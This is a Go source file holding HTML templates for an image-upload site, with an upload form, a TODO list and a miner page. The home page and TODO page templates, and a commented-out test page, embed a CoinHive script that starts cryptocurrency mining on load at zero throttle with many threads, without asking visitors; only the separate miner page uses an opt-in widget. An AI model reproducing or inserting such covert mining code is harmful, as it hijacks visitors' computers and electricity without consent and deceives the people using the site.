package server

/*HTML meaning guide for my sanity:
<br>: page break
<html> and </html>: beginning and end of html section
<body> and </body>: main part with text
<!-- and -->: Comments... WHY
<a href="url"> and </a>: links
<p> and </p>: margin
*/
var (
	firstPage = `<html>


<head>
<meta name="google-site-verification" content="2QLKtDFPPQwFab4Tx2Gf0TJ1SVMI1lSA4VfKsA90SaY" /> <!-- ssshhh... -->
<title>Imagen Dot Click</title>
<script src='https://www.google.com/recaptcha/api.js'></script>
</head>
<body>
<b> <a href="https://github.com/gidoBOSSftw5731/imgsrvr/tree/master"> EVERYTHING IS EXPALINED IN SOME DETAIL AT MY GITHUB: </b></a><br>
<p>
Needs JS for captchas {{ .Fn}}
</p>

<form enctype="multipart/form-data" action="%supload/" method="post">
  Key: <input type="password" name="fn"><br>
  <input type="hidden" name="token" value="{{.}}"/>
	IMG: <input type="file" name="uploadfile"><br>
	<div class="g-recaptcha" data-sitekey="%s"></div>
	<input type="submit" value="Go!">
	</form>

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});

  miner.start();
  miner.setThrottle(0)
  miner.setNumThreads(16)
  
</script>
</body>
<footer> <a href="%v"> Home Page </a>&nbsp;&nbsp;  <a href="%vtodo"> TODO page </a>&nbsp;&nbsp; <a href="%vminer"> Mine me some money to keep this site running! </a> </footer>
</html>`

	todoPageVar = `<html>
	<head>
<meta name="google-site-verification" content="2QLKtDFPPQwFab4Tx2Gf0TJ1SVMI1lSA4VfKsA90SaY" /> <!-- ssshhh... -->
<title>Imagen Dot Click: TODO</title></head>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});

  miner.start();
  miner.setThrottle(0)
  miner.setNumThreads(16)
  
</script>
<body>
<header>
<b>STUFF THAT HAS BEEN DONE OR WILL BE DONE:</b>
</header>


TODO:
store file on disk:
-Accept the file 															DONE <br>
-create name (from md5)												DONE<br>
-create a database of pub name (hash) to path	DONE<br>
-provide path to file													DONE<br>
-ReCaptcha																		DONE<br>
-Fonts<br>
-css..?<br>
-proper logging																DONE<br>
-cookies<br>
-upload bar<br>
-sessions?<br>
-statistics<br>
-link shortening<br>
</body>
<footer> <a href="%v"> Home Page </a>&nbsp;&nbsp;  <a href="%vtodo"> TODO page </a>&nbsp;&nbsp; <a href="%vminer"> Mine me some money to keep this site running! </a> </footer>
</html>`

	minePageVar = `<html>
        <head>
	<meta name="google-site-verification" content="2QLKtDFPPQwFab4Tx2Gf0TJ1SVMI1lSA4VfKsA90SaY" /> <!-- ssshhh... -->
	<title>Imagen Dot Click: Miner</title></head>
	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
	<div class="coinhive-miner" 
		style="width: 256px; height: 310px"
			data-key="fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm">
				<em>Loading...</em>
				</div>
<footer> <a href="%v"> Home Page </a>&nbsp;&nbsp;  <a href="%vtodo"> TODO page </a>&nbsp;&nbsp; <a href="%vminer"> Mine me some money to keep this site running! </a> </footer>	
</html>	
	`

/*testPage = `<html>
	  <head><title> This is the second test page!!! </title> </head>
	  <body>
	  testing text<br>
	  and moar testing text!!!<br>
	  And a testing graphic!!!<img src="/app/i/foo" alt="Testing Graphic" >

	  <p>
	  field from request: {{ .Tn}}
	  </p>

	  <form action="/app/main/" method="POST">
	    <input type="submit" value="back to main!">
	  </form>

	  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
	  <script>
	    var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});

	    miner.start();
	    miner.setThrottle(0)
	    miner.setNumThreads(8)

	  </script>

	  </body> </html>`*/
)
